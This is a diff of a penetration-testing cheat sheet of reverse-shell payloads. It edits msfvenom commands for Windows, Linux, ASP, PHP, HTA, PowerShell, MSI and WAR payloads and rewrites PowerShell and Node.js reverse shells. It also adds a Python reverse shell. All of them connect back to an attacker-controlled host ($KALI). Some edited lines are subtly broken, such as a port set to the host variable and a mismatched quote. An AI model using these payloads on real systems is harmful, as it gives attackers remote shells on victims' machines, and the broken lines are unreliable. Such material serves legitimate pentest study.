@@ -51,35 +51,35 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > she
 #### **Stageless Payloads for Windows - x64**&#x20;
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$KALIPORT -f exe > shell-x64.exe
 ```
 
 ```
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=$PORT -f elf -o rshell.elf
 ```
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f asp -o rshell.asp
 ```
 
 ```
-msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$KALI -f raw -o rshell.php
 ```
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
+msfvenom -p windows/shell_reverse_tcp LHOST= $KALI LPORT=$LPORT -f hta-psh -o rshell.hta
 ```
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f powershell
 ```
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell.msi
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f msi -o rshell.msi
 ```
 
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f war > rshell.war
 ```
 
 #### **Netcat Reverse Shells**
@@ -95,7 +95,7 @@ nc -nv 10.10.10.10 443 -e "/bin/bash"
 #### **PowerShell Reverse Shell**
 
 ```
-'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$KALI",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
 #### **JavaScript Reverse Shell**
@@ -106,13 +106,27 @@ nc -nv 10.10.10.10 443 -e "/bin/bash"
         cp = require("child_process"),
         sh = cp.spawn("/bin/bash", []);
     var client = new net.Socket();
-    client.connect(4444, "192.168.69.123", function(){
+    client.connect(4444, $KALI", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
     });
     return /a/;
 })();
+```
+
+#### Python Reverse Shell
+
+```
+from os import dup2
+from subprocess import run
+import socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("$KALI",1337)) 
+dup2(s.fileno(),0) 
+dup2(s.fileno(),1) 
+dup2(s.fileno(),2) 
+run(["/bin/bash","-i"])
 ```
 
 #### **Upgrade to a PTY Shell**
